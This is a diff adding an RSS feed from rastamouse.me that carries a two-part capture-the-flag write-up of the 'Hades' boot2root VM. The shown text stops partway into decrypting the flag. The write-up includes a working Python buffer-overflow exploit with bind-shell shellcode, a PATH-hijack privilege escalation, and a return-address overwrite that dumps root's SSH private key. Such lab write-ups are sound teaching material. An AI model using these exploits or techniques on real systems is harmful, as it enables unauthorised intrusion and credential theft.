@@ -1,0 +1,513 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Hades on rastamouse.me</title>
+    <link>http://rastamouse.me/tags/hades/</link>
+    <description>Recent content in Hades on rastamouse.me</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Thu, 05 Jun 2014 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/tags/hades/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>The Infernal: Hades - Part 1</title>
+      <link>http://rastamouse.me/writeups/2014/hades-part-1/</link>
+      <pubDate>Thu, 05 Jun 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2014/hades-part-1/</guid>
+      <description>
+
+&lt;p&gt;Hades is a new boot2root challenge pitched at the advanced hobbyist.  Solving this challenge will require skills in reverse engineering, exploit development and understanding of computer architecture.  The aim of this challenge is to incrementally increase access to the box until you can escalate to root.  The /root/flag.txt file is the final goal.&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s mosey&amp;hellip;&lt;/p&gt;
+
+&lt;h2 id=&#34;enumeration:cb235dd34a9cd98c7241a4f538aa5bc4&#34;&gt;Enumeration&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -A -p- 192.168.127.132
+  
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 e1:47:74:6c:b5:9c:8b:76:fd:92:77:91:fa:e7:f4:ee (DSA)
+|   2048 9c:a0:0b:f3:63:2e:8e:10:77:e9:a3:5a:dd:f1:6d:46 (RSA)
+|_  256 0b:8d:d1:bf:6e:b8:cf:99:38:64:f0:58:bb:3c:45:77 (ECDSA)
+65535/tcp open  unknown
+1 service unrecognized despite returning data.
+[...snip...]
+&amp;quot;Welcome\x20to\x20t
+SF:he\x20jungle\.\x20\x20\nEnter\x20up\x20to\x20two\x20commands\x20of\x20l
+SF:ess\x20than\x20121\x20characters\x20each\.\n\0Got\x20it\n&amp;quot;
+[...snip...]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Just from reading the Nmap output, it seems the service on 65535 prompts for some input and was accepting Nmap probes, but not outputting anything useful.  I tried connecting to the port with &lt;code&gt;netcat&lt;/code&gt;, but it was unable to connect.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc 192.168.127.132 65535
+nc: unable to connect to address 192.168.127.132, service 65535
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I tried verifying the port was open with Nmap, but it was reported as being closed.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sS 192.168.127.132 -p 65535
+PORT      STATE  SERVICE
+65535/tcp closed unknown
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I put &lt;code&gt;Nmap&lt;/code&gt; on a loop, to keep checking whether the port automatically came back up.  I lost patience after a few minutes, so just rebooted the VM.  Good start :D.  At this point I assumed one of the Nmap probes somehow crashed the application.&lt;/p&gt;
+
+&lt;p&gt;When it came back up, I had a bit of a play.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc 192.168.127.132 65535
+Welcome to the jungle.  
+Enter up to two commands of less than 121 characters each.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Every input I entered returned a &lt;em&gt;&amp;ldquo;Got it&amp;rdquo;&lt;/em&gt; message and after two commands are entered, the application stops responding and I had to re-connected.  The app does express there&amp;rsquo;s a character limit for the commands of &amp;lt;121 each, so I sent one large string of 242 A&amp;rsquo;s.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# python -c &#39;print (&amp;quot;A&amp;quot; * 242)&#39; | nc 192.168.127.132 65535
+Welcome to the jungle.  
+Enter up to two commands of less than 121 characters each.
+Got it
+Got it
+
+root@kali:~# nc 192.168.127.132 65535
+nc: unable to connect to address 192.168.127.132, service 65535
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So that crashed the application, but I currently had no way to analyise or debug what was happening.&lt;/p&gt;
+
+&lt;p&gt;With this a dead-end, for now, I turned my attention to the SSH service.  I attempted an SSH connection to Hades and was surprised to see a mass of output.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh 192.168.127.132
+f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAoIUECDQAAABUDgAAAAAAADQAIAAIACgAHwAcAAYAAAA0
+[...snip...]
+aXN0ZXJDbGFzc2VzAHNvY2tldEBAR0xJQkNfMi4wAF9fVE1DX0VORF9fAF9JVE1fcmVnaXN0ZXJU
+TUNsb25lVGFibGUAX2luaXQAdjAAdjIA
+root@192.168.127.132&#39;s password:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This looked like it was encoded somehow to me.  I copied the text into Burpsuite&amp;rsquo;s Decoder function and tried various decoding methods.  I eventually reached base64 and I could suddenly see some plaintext strings.  Including binary functions (socket, strcpy, _start_main etc).&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/hades/base64.png&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;I converted the file into an executable binary, and ran it on my Kali VM.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/hades# base64 -d file &amp;gt; binary
+
+root@kali:~/hades# file binary 
+binary: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xc0bc41d21254d7f04d83fec32b7345d3505c0759, not stripped
+
+root@kali:~/hades# ./binary
+  
+root@kali:~/hades# netstat -antp
+tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      4402/binary     
+  
+root@kali:~/hades# nc localhost 65535
+Welcome to the jungle.  
+Enter up to two commands of less than 121 characters each.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So it looks as though I have a copy of the app running on Hades - time to exploit it!&lt;/p&gt;
+
+&lt;h2 id=&#34;burn-baby-burn:cb235dd34a9cd98c7241a4f538aa5bc4&#34;&gt;Burn Baby Burn&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/hades# checksec --file binary 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   binary
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There appears to be minimal protection on the binary itself - hopefully this will be a strightforward exercise :D &amp;hellip;yeah, right.  I loaded it up in GDB and crashed it with a string of A&amp;rsquo;s.  It looks like I control &lt;code&gt;EBP&lt;/code&gt; and &lt;code&gt;EIP&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+  
+(gdb) i r
+eax            0x5     5
+ecx            0xb7fbf4e0     -1208224544
+edx            0xb7fc0360     -1208220832
+ebx            0xb7fbeff4     -1208225804
+esp            0xbffff350     0xbffff350
+ebp            0x41414141     0x41414141
+esi            0x0     0
+edi            0x0     0
+eip            0x41414141     0x41414141
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Using the pattern offset method, I determined that &lt;code&gt;EIP&lt;/code&gt; was overwritten after &lt;code&gt;171 bytes&lt;/code&gt; and &lt;code&gt;EBP&lt;/code&gt; at &lt;code&gt;167&lt;/code&gt;.  I threw some more data at the binary to see what else could be overwritten.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;root@kali:~/hades# python -c &#39;print (&amp;quot;A&amp;quot; * 163) + (&amp;quot;B&amp;quot; * 4) + (&amp;quot;C&amp;quot; * 4) + (&amp;quot;D&amp;quot; * 50)&#39; | nc localhost 65535&lt;/code&gt;&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/hades/eip.png&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The above stack shows that &lt;code&gt;EIP&lt;/code&gt; (red) and &lt;code&gt;EDB&lt;/code&gt; (green) have been overwritten and that the buffer of A&amp;rsquo;s has been split, the majority highlighted in yellow.  It looks like the large group of A&amp;rsquo;s is about &lt;code&gt;112 bytes&lt;/code&gt; in total, plenty of room for some shellcode if I can get there.  There are about &lt;code&gt;28 bytes&lt;/code&gt; which I need to remove from &lt;code&gt;ESP&lt;/code&gt;, so that it can point directly at my buffer.&lt;/p&gt;
+
+&lt;p&gt;I started looking for instructions in the binary which I could use to manipulate &lt;code&gt;ESP&lt;/code&gt;, and came across this add &lt;code&gt;ESP&lt;/code&gt; instruction.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;8048a32:   83 c4 1c                add    esp,0x1c&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;This will add &lt;code&gt;28&lt;/code&gt; (1C) bytes to &lt;code&gt;ESP&lt;/code&gt;, as desired.  But I need to know what other instructions come after this.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;8048a32:       83 c4 1c                add    esp,0x1c
+8048a35:       5b                      pop    ebx
+8048a36:       5e                      pop    esi
+8048a37:       5f                      pop    edi
+8048a38:       5d                      pop    ebp
+8048a39:       c3                      ret    
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I also found a &lt;code&gt;JMP ESP&lt;/code&gt; instruction.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;8048697:    ff e4                   jmp    esp&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;So, this looks pretty good - after the add &lt;code&gt;ESP&lt;/code&gt; instruction, a bunch of the registers are pop&amp;rsquo;d followed by a return.&lt;/p&gt;
+
+&lt;p&gt;I followed this through in GDB by setting up a hook, and placing a break point on &lt;code&gt;0x8048a32&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;(gdb) define hook-stop
+Type commands for definition of &amp;quot;hook-stop&amp;quot;.
+End with a line saying just &amp;quot;end&amp;quot;.
+&amp;gt;disassemble
+&amp;gt;x/10x $esp
+&amp;gt;i r
+&amp;gt;end
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;root@kali:~/hades# python -c &#39;print (&amp;quot;A&amp;quot; * 171) + &amp;quot;\x32\x8a\x04\x08&amp;quot;&#39; | nc localhost 65535&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The breakpoint is reached, which means the jump was successful.  The advantage of the hook, is that I can now do &lt;code&gt;stepi&lt;/code&gt; to execute the next instruction and GDB will automatically print out the instructions in the hook (saving me a lot of time and typing :)).  It allows me to see the state of the stack and registers easily after each instruction.&lt;/p&gt;
+
+&lt;p&gt;Just before the return is executed, this is how things look:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;   0x08048a32 &amp;lt;+82&amp;gt;:  add    esp,0x1c
+   0x08048a35 &amp;lt;+85&amp;gt;:  pop    ebx
+   0x08048a36 &amp;lt;+86&amp;gt;:  pop    esi
+   0x08048a37 &amp;lt;+87&amp;gt;:  pop    edi
+   0x08048a38 &amp;lt;+88&amp;gt;:  pop    ebp
+=&amp;gt; 0x08048a39 &amp;lt;+89&amp;gt;:   ret    
+End of assembler dump.
+0xbffff38c: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff39c: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff3ac: 0x41414141  0x41414141
+eax            0x5  5
+ecx            0xb7fbf4e0   -1208224544
+edx            0xb7fc0360   -1208220832
+ebx            0x41414141   1094795585
+esp            0xbffff38c   0xbffff38c
+ebp            0x41414141   0x41414141
+esi            0x41414141   1094795585
+edi            0x41414141   1094795585
+eip            0x8048a39    0x8048a39 &amp;lt;__libc_csu_init+89&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;EIP&lt;/code&gt; is currently pointing to &lt;code&gt;0x8048a39&lt;/code&gt;, so when I execute the return it should result in a crash (since &lt;code&gt;0x41414141&lt;/code&gt; is just bollocks).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;No function contains program counter for selected frame.
+0x41414141 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A little more analysis shows that when the ret is evenually executed, I return &lt;code&gt;17 bytes&lt;/code&gt; inside the original buffer.  I now started to flesh out an exploit in python, aptly dubbed &lt;code&gt;zeus.py&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;I needed some shellcode to execute, but in such a small space the usual Metasploit generated stuff was going to be too big.  I have the &lt;code&gt;shell-storm&lt;/code&gt; Python API installed, so was able to find some small (&lt;code&gt;73 bytes&lt;/code&gt;) bind shellcode fairly easily.&lt;/p&gt;
+
+&lt;p&gt;The structure of the exploit will go: &lt;em&gt;[JUNK][JMP ESP][SHELLCODE][PADDING][ADD ESP&amp;hellip;RET]&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;EIP&lt;/code&gt; will be overridden by the address for add &lt;code&gt;ESP&lt;/code&gt; and the pop&amp;rsquo;s and ret instruction will follow, as demonstrated.  This will remove the &lt;code&gt;17 bytes&lt;/code&gt; of junk from the beginning of the buffer.  When the &lt;code&gt;ret&lt;/code&gt; instruction is followed, execution flow will land on &lt;code&gt;JMP ESP&lt;/code&gt; and execute the shellcode.  My final exploit is as follows:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+  
+import socket
+  
+target = &#39;192.168.127.132&#39;
+port = 65535
+  
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  
+shellcode = (&amp;quot;\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a&amp;quot; # 73 bytes, bind on 11111
+&amp;quot;\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68&amp;quot;
+&amp;quot;\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1&amp;quot;
+&amp;quot;\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd&amp;quot;
+&amp;quot;\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f&amp;quot;
+&amp;quot;\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f&amp;quot;
+&amp;quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3&amp;quot;
+&amp;quot;\x41\xcd\x80&amp;quot;)
+  
+buffer = (&amp;quot;\x90&amp;quot; * 17)
+buffer += &amp;quot;\x97\x86\x04\x08&amp;quot; # jmp esp
+buffer += shellcode
+buffer += (&amp;quot;\x90&amp;quot; * 77) # junk padding
+buffer += &amp;quot;\x32\x8a\x04\x08&amp;quot; # add esp etc...
+  
+try:
+        s.connect((target, port))
+        s.recv(1024)
+        s.send(buffer)
+  
+except:
+        print &amp;quot;Couldn&#39;t connect to Hades&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Connect to the bind port with netcat and&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;id; whoami
+uid=1000(loki) gid=1000(loki) groups=1000(loki),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
+loki
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>The Infernal: Hades - Part 2</title>
+      <link>http://rastamouse.me/writeups/2014/hades-part-2/</link>
+      <pubDate>Thu, 05 Jun 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2014/hades-part-2/</guid>
+      <description>
+
+&lt;h2 id=&#34;ssh-persistence:b4994bab40eb34750ec826f32c93e1ca&#34;&gt;SSH Persistence&lt;/h2&gt;
+
+&lt;p&gt;With shell access as loki, I did some standard system enumeration and found that he was the only user, and that SSH was running.  Loki didn&amp;rsquo;t have a &lt;code&gt;.ssh&lt;/code&gt; directory in his home folder, so I created one and popped my public SSH key into &lt;code&gt;authorized_keys&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;If you &lt;code&gt;cat&lt;/code&gt; loki&amp;rsquo;s &lt;code&gt;.bash_history&lt;/code&gt; file, you get a small troll from lok_sigma.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;loki@Hades:~$ cat .bash_history
+Really?  Not that kind of challenge....
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Poking around, I found a few more interesting files.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;loki@Hades:/$ ls -la /
+drwxr-xr-x  2 root root  4096 Mar 18 20:31 display_root_ssh_key
+-r--------  1 root root  9984 Mar 19 17:27 key_file
+  
+loki@Hades:/$ ls -la /display_root_ssh_key/
+-rw-------  1 root root      1 Mar 19 19:38 counter
+-rwsr-sr-x  1 root root 273048 Mar 18 20:31 display_key
+  
+loki@Hades:/display_root_ssh_key$ file display_key 
+display_key: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, stripped
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Looks like another binary with the SUID bit set, and is owned by root.  I gave it a little poke and&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;loki@Hades:/display_root_ssh_key$ ./display_key 
+    Ready to dance?
+Enter password: 
+lok_sigma
+loki@Hades:/display_root_ssh_key$ ./display_key 
+    Ready to dance?
+Enter password: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Broadcast message from loki@Hades
+    (/dev/pts/1) at 2:20 ...
+The system is going down for reboot NOW!
+Connection to 192.168.127.128 closed by remote host.
+Connection to 192.168.127.128 closed.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The damn VM just rebooted itself!  I thought perhaps this may&amp;rsquo;ve been because I entered a long string of A&amp;rsquo;s, but I tried it again with normal words and the same thing happened.  I downloaded the file to my Kali VM for analysis.&lt;/p&gt;
+
+&lt;h2 id=&#34;give-me-key:b4994bab40eb34750ec826f32c93e1ca&#34;&gt;Give me Key!&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/hades# checksec --file display_key
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   display_key
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/hades# strings display_key | less
+cat /root/.ssh/id_rsa
+rt0oun
+     Ready to danc
+EE patword:
+FATAL
+  
+$Info: This file is a doozy.  I hope you like it.  This *is* the right one, and when you exploit it you will get what you need.  Read the instructions. $
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This binary is designed to display the private SSH key of the root user (which is why it needs to run as root).  I moved my &lt;code&gt;sbin/reboot&lt;/code&gt; file to &lt;code&gt;sbin/reboot.bk&lt;/code&gt; in the hope that this would stop my VM from rebooting, and ran the binary through &lt;code&gt;strace&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/hades# strace -i -ff ./display_key 
+[080568ee] open(&amp;quot;counter&amp;quot;, O_RDONLY)    = -1 ENOENT (No such file or directory)
+[08049d8b] --- SIGSEGV (Segmentation fault) @ 0 (0) ---
+[????????] +++ killed by SIGSEGV +++
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It crashes because it can&amp;rsquo;t open the counter file.  The file permission on hades were such that I couldn&amp;rsquo;t download the real counter file, so I just created an empty file (&lt;code&gt;touch counter&lt;/code&gt;).&lt;/p&gt;
+
+&lt;p&gt;I followed it through a few times until it tried to reboot again and saw the following:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[pid  2949] [b77d0424] stat64(&amp;quot;/usr/local/sbin/reboot&amp;quot;, 0xbfeaa3b0) = -1 ENOENT (No such file or directory)
+[pid  2949] [b77d0424] stat64(&amp;quot;/usr/local/bin/reboot&amp;quot;, 0xbfeaa3b0) = -1 ENOENT (No such file or directory)
+[pid  2949] [b77d0424] stat64(&amp;quot;/usr/sbin/reboot&amp;quot;, 0xbfeaa3b0) = -1 ENOENT (No such file or directory)
+[pid  2949] [b77d0424] stat64(&amp;quot;/usr/bin/reboot&amp;quot;, 0xbfeaa3b0) = -1 ENOENT (No such file or directory)
+[pid  2949] [b77d0424] stat64(&amp;quot;/sbin/reboot&amp;quot;, 0xbfeaa3b0) = -1 ENOENT (No such file or directory)
+[pid  2949] [b77d0424] stat64(&amp;quot;/bin/reboot&amp;quot;, 0xbfeaa3b0) = -1 ENOENT (No such file or directory)
+[pid  2949] [b77d0424] write(2, &amp;quot;sh: 1: &amp;quot;, 7sh: 1: ) = 7
+[pid  2949] [b77d0424] write(2, &amp;quot;reboot: not found&amp;quot;, 17reboot: not found) = 17
+[pid  2949] [b77d0424] write(2, &amp;quot;\n&amp;quot;, 1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;v1-bug:b4994bab40eb34750ec826f32c93e1ca&#34;&gt;v1 Bug&lt;/h2&gt;
+
+&lt;p&gt;This shows that &lt;code&gt;reboot&lt;/code&gt; is executed, but an absolute path is not coded into the binary, which is why it cycles through each of the envronmental paths (&lt;code&gt;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&lt;/code&gt;).  It was later reported that this was an unintentional bug in the VM, as it made it a little too easy to get root access.  All that was required was to place a binary or symlink into any directory, name it reboot, and insert a new directory into the PATH variable.  This could be used to execute a new instance of &lt;code&gt;/bin/bash&lt;/code&gt;, for example, as root.&lt;/p&gt;
+
+&lt;p&gt;This was fixed in v1.0.1 of the challenge.&lt;/p&gt;
+
+&lt;h2 id=&#34;a-man-s-solution:b4994bab40eb34750ec826f32c93e1ca&#34;&gt;A Man&amp;rsquo;s Solution!&lt;/h2&gt;
+
+&lt;p&gt;I was able to crash the application by sending 100 A&amp;rsquo;s as a password.  I loaded it up in GDB to confirm.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/hades# gdb ./display_key -q
+Enter password: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+  
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+  
+(gdb) i r
+eax            0x7f00   32512
+ecx            0xbfffe394   -1073749100
+edx            0x0  0
+ebx            0x0  0
+esp            0xbfffe4c0   0xbfffe4c0
+ebp            0x41414141   0x41414141
+esi            0x8048a20    134515232
+edi            0xa5325e00   -1523425792
+eip            0x41414141   0x41414141
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It looks like I can own &lt;code&gt;EDP&lt;/code&gt; and &lt;code&gt;EIP&lt;/code&gt;.  Even though I sent 100 A&amp;rsquo;s, it looks like only 24 are getting to the stack.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;(gdb) x/20x $esp
+0xbfffe4c0: 0xbfffe400  0x00000019  0x080ca7e0  0x00000001
+0xbfffe4d0: 0xbfffe4e8  0x41048e97  0x41414141  0x41414141
+0xbfffe4e0: 0x41414141  0x41414141  0x41414141  0x00414141
+0xbfffe4f0: 0x00000001  0xbfffe58c  0xbfffe594  0x00000000
+0xbfffe500: 0x00000000  0x00000000  0x00000000  0x00000000
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;EIP&lt;/code&gt; is overwritten at &lt;code&gt;20 bytes&lt;/code&gt; and &lt;code&gt;EDP&lt;/code&gt; at &lt;code&gt;16&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Because the binary is stripped of symbols, it makes it really hard to debug and find functions etc.  All I really needed was to jump directly to the cat instruction and bypass the password entry.&lt;/p&gt;
+
+&lt;p&gt;I used GDB to search blocks of memory for an instance where &lt;code&gt;cat /root&lt;/code&gt; existed.  I looked at the memory mappings to use as my address ranges.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/hades# cat /proc/3490/maps
+00c01000-00c02000 r-xp 00000000 08:01 1578682    /root/hades/display_key
+08048000-080ca000 r-xp 00000000 00:00 0
+080ca000-080ef000 rwxp 00000000 00:00 0          [heap]
+b7ffd000-b7fff000 rwxp 00000000 00:00 0
+b7fff000-b8000000 r-xp 00000000 00:00 0          [vdso]
+bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]
+
+(gdb) find /b 0x08048000, 0x080ca000, &#39;c&#39;, &#39;a&#39;, &#39;t&#39;, &#39; &#39;, &#39;/&#39;
+0x80ab408
+1 pattern found.
+  
+(gdb) x/s 0x80ab408
+0x80ab408:   &amp;quot;cat /root/.ssh/id_rsa&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I tried my luck at jumping directly to this locatation, but no dice.  I thought the way this was probably working, is for this to get loaded into one of the CPU registers as a variable for execv or something.  Since it&amp;rsquo;s a statically linked binary, this address must be referenced in a function somewhere&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;For the life of me, I couldn&amp;rsquo;t work out how to search for this in GDB.  If you&amp;rsquo;re reading this and know how, please let me know.&lt;/p&gt;
+
+&lt;p&gt;This meant I had to manually search through areas of memory, to find if they contained a reference to this address.  The way I did this was to SSH into my Kali VM with Putty, and use it&amp;rsquo;s console logging option to log everything to a text file.  Then use good ole Ctrl+F.  It became a case of&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;x/100i 0x8048000&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&amp;hellip;and putting a weight on the Return key whilst I stepped out to read a book!&lt;/p&gt;
+
+&lt;p&gt;Eventually the whole section of memory (&lt;code&gt;0x8048000-0x80ca000&lt;/code&gt;) was dumped out to a text file (1.77MB in size).  I did a search for &lt;code&gt;0x80ab408&lt;/code&gt; and got one hit.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;0x804825a:     mov    DWORD PTR [esp],0x80ab408&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;I went to that area of memory to see which instructions surrounded it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;0x8048254:     push   ebp
+0x8048255:     mov    ebp,esp
+0x8048257:     sub    esp,0x18
+0x804825a:     mov    DWORD PTR [esp],0x80ab408
+0x8048261:     call   0x80493a0
+0x8048266:     leave 
+0x8048267:     ret
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I also had a look at &lt;code&gt;0x80493a0&lt;/code&gt;, which contained a &lt;code&gt;Push EBP&lt;/code&gt; instruction.
+Before trying to screw around too much, I thought I&amp;rsquo;d try and jump to &lt;code&gt;0x804825a&lt;/code&gt;&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/hades# python -c &#39;print (&amp;quot;A&amp;quot; * 20) + &amp;quot;\x5a\x82\x04\x08&amp;quot;&#39; | ./display_key 
+    Ready to dance?
+Enter password: 
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAvggYLQeERLoR4kjgJqU1GIWvcKaieMOfrwv4p/1o+VRUTdeA
+[...snip...]
+x1Xlob/xYTUViso5Exxd8y72SvglgBT7M+g8bSbXMdq4EO3GKfIF
+-----END RSA PRIVATE KEY-----
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The application still seg faults, but at least my exploit worked!&lt;/p&gt;
+
+&lt;h2 id=&#34;get-to-da-flag:b4994bab40eb34750ec826f32c93e1ca&#34;&gt;Get to da Flag&lt;/h2&gt;
+
+&lt;p&gt;I coped the hades root private key to my Kali VM, and was able to SSH in as root :)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/hades# ssh root @ 192.168.127.128 -i private_key 
+root@Hades:~# id; whoami
+uid=0(root) gid=0(root) groups=0(root)
+root
+
+root@Hades:~# ls -la /root/
+-rw-r--r--  1 root root 3376 Mar 19 19:05 flag.txt.enc
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This file is encrypted with &lt;code&gt;OpenSSL&lt;/code&gt;, as given away by the file header.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/hades# strings flag.txt.enc | head
